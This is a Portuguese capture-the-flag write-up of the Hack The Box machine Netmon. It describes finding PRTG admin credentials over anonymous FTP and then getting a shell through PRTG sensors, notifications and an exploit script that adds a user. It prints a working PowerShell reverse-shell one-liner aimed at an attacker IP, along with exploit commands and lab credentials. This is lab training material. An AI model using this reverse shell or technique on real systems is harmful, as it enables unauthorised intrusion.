---
title: "Hack The Box - Netmon"
tags: [Windows,Easy,Web,Nishang,PSExec]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/177>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 5 portas abertas

> Porta 21 -> Servidor FTP, não identificou a versão mas temos *login anonimo*, bom ponto para enumerarmos um pouco mais

> Porta 80 -> Servidor Web PRTG

> Portas 135, 139 e 445 -> Relacionadas ao servidor de compartilhamento de arquivos

## Enumeração da porta 21

### Como sabemos que temos acesso anonimo no servidor, vamos aproveitá-lo para levantamento de informações do host

___

Um site interessante onde há diversas dicas de locais onde procurar por arquivos que podem conter alguma informação sensível:

https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/

___

#### Voltando para a Box, logamos no sevidor FTP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_ftp.png)

#### Após uma navegada nas pastas o único arquivo que nos pareceu útil foi um *.bak* de configuração, possivelmente deve ter alguma credencial de acesso, então baixamos ele para nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_ftp1.png)

#### Verificamos seu conteúdo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_pass.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_pass1.png)

Encontramos as seguintes credenciais:

`PRTGSystemAdministrator:PrTg@dmin2018`

Possivelmente de login na porta 80

## Enumeração da porta 80

### Verificamos um servidor PRTG nessa porta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_web.png)

Não conseguimos logar em lugar nenhum com essa senha que conseguimos no FTP. Percebemos que a box foi feita em 2019, e está 2018 ai, então tentamos mudar o ano e logar no servidor web que tem ali
E da certo, por incrível que pareca

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_web1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_web2.png)

# Exploração

### Procuramos por vulnerabilidades dessa versão do PRTG 18.1

#### Encontramos essa:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_web3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_web4.png)

# Exploração manual da vulnerabilidade

# Primeiro modo -> Através dos *Sensores*

O PRTG é uma ferramenta de monitoramento muito boa, ela suporta controlarmos diversos sensores, como por exemplo, ping, HTTP, SMTP... a partir dai já podemos enxergar o que podemos realizar no servidor.

#### Vamos em `Sensors` - Add Sensors - Selecionamos o IP 10.10.10.152 - Continue

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_web5.png)

#### Adicionaremos um sensor do tipo *EXE/Script*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_web6.png)

_______

Utilizaremos o `nishang` para conseguir um shell
Ferramenta excelente, todo mundo deve ter ela em seu arsenal

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_nishang0.png)

O que utilizaremos é o *PowerShellTcpOneLine*, ou seja Shell Reverso em uma linha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_nishang.png)

```
$sm=(New-Object Net.Sockets.TCPClient('10.10.16.119',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```

________

#### No caso iremos adicionar um `;` antes do comando.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_sensor.png)

#### Ao adicionarmos selecionamos a Task e executamos (com o listener aberto)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_sensor1.png)

#### Recebemos o shell de Authority na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_shell.png)

# Segundo modo -> Através dos *Tickets*

Setup - Notifications

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_set1.png)

Ticket Notification

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_tic2.png)

Execute Program

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_exec.png)

Configuramos pra nos dar um shell

Caso executamos direto ele não vai funcionar, possivelmente por que tem bad chars dentro dele, então devemos converter para `UTF-16LE`

Ficará assim:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_base641.png)

Copiamos e colamos no sistema

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_ac2.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_send.png)

Ganhamos o shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_send2.png)

#### Pegamos a flag de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_user.txt.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_root.png)

# Terceiro modo -> Maneira automatizada

Temos um script que cria um usuário na máquina e logo após isso conseguimos logar com o `psexec.py`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_exp1.png)

Copiamos para nossa máquina ele e verificamos como executar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_exp2.png)

Verificamos que ele necessita dos Cookies do administrador quando logado

Aqui estão os dados

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_exp3.png)

Exploramos ele

> ./exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.118143135.1589685620; OCTOPUS1813713946=ezc0NjBDNEEzLTZDMEUtNEYzOC04NUMyLTUzNDhCRTBCNDcwOH0%3D; _gat=1"

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_exp4.png)

## Com o `psexec.py` conseguimos acesso à máquina

> psexec.py pentest@10.10.10.152
> P3nT3st!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-netmon/Netmon_final.png)